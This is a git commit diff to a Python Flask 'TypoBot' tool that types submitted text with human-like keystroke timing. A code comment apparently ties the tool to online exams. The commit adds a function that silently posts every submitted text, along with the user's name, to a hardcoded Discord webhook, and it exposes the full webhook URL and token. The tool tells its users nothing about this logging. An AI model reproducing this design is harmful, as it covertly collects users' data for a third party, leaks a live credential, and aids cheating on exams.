1d9dbb74fd0d83eda9ebf5717bcd5be4dea709cd
Tholkappiar <tholkappiar2003@gmail.com>
2024-02-01 19:32:01 +0530

    feat: discord webhook connection.

--- script.py
+++ script.py
@@ -1,10 +1,37 @@
 import random
-import os
+import requests
 from flask import Flask, render_template, request, jsonify
 import pyautogui
 import time
 
 app = Flask(__name__)
+
+# send message to discord using webhook
+def send_to_discord_webhook(user, message, webhook_url):
+
+    dis_mes = "user : " + user + "\ndata : " + message
+    data = {
+        'content': dis_mes
+    }
+    print("Sending data to webhook:", data)
+    response = requests.post(webhook_url, json=data)
+    if response.status_code != 200:
+        print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")
+
+#  simulate typing like a human
+def type_like_human(text):
+    for char in text:
+        pyautogui.typewrite(char)
+        # random delay between 0.1 to 0.3 seconds
+        time.sleep(0.05 + 0.1 * random.random())
+
+    # Select & Delete selected text - TODO: this may cause issue in online exams 
+    # pyautogui.keyDown('ctrl')
+    # pyautogui.keyDown('shift')
+    # pyautogui.press('end')
+    # pyautogui.keyUp('ctrl')
+    # pyautogui.keyUp('shift')
+    # pyautogui.press('backspace')
 
 @app.route('/')
 def index():
@@ -13,24 +40,18 @@ def index():
 @app.route('/submit', methods=['POST'])
 def submit():
     text = request.form['text']
+    
+    global name
+
+    # Send logged data to Discord using webhook
+    webhook_url = 'https://discord.com/api/webhooks/1202594759198249050/IeMG-h-iG_dYaDlzkcJPOwhoisyOk9jhBadTGZHwSSp4iEDQT0IsbIpNh_j9dBp3SgTV'
+    
+    send_to_discord_webhook(name, text, webhook_url)
+    
     type_like_human(text)
-    return jsonify({'message': 'Text submitted and typed successfully!'})
+    
+    return jsonify({'message': 'Text submitted and typed successfully!', 'content': text})  # Return a JSON response with the submitted text
 
-def type_like_human(text):
-    for char in text:
-        pyautogui.typewrite(char)
-        # random delay between 0.1 to 0.3 seconds
-        time.sleep(0.05 + 0.1 * random.random())
-        # time.sleep(0.1 + 0.2 * random.random())
-
-    # Select & Delete selected text - TODO: this may cause issue in online exams 
-    pyautogui.keyDown('ctrl')
-    pyautogui.keyDown('shift')
-    pyautogui.press('end')
-    pyautogui.keyUp('ctrl')
-    pyautogui.keyUp('shift')
-
-    pyautogui.press('backspace')
 
 def shutdown_server():
     func = request.environ.get('werkzeug.server.shutdown')
@@ -44,12 +65,10 @@ def shutdown():
     return 'Server shutting down...'
 
 if __name__ == '__main__':
-    # ANSI escape codes for professional colors
     YELLOW = '\033[93m'
     GREEN = '\033[92m'
     RESET = '\033[0m'
 
-     # Banner
     banner = """
     ████████╗██╗   ██╗██████╗  ██████╗ ██████╗  ██████╗ ████████╗
     ╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝
@@ -59,15 +78,13 @@ if __name__ == '__main__':
        ╚═╝      ╚═╝   ╚═╝      ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝   
                                                                  """
 
-    # Print banner
     print(f"{YELLOW}{banner}{RESET}")
 
-    # Repo link
     repo_link = "https://github.com/Tholkappiar"
-
-    # Prompt the user to check out a repo and give it a star
     print(f"{YELLOW}If interested, take a look at our repository and give it a star: {GREEN}{repo_link}{RESET}")
-    
+
+    name = input("Enter your Name (Mandatory): ")
+
     try:
         app.run(host='0.0.0.0', port=5000)
     except KeyboardInterrupt:
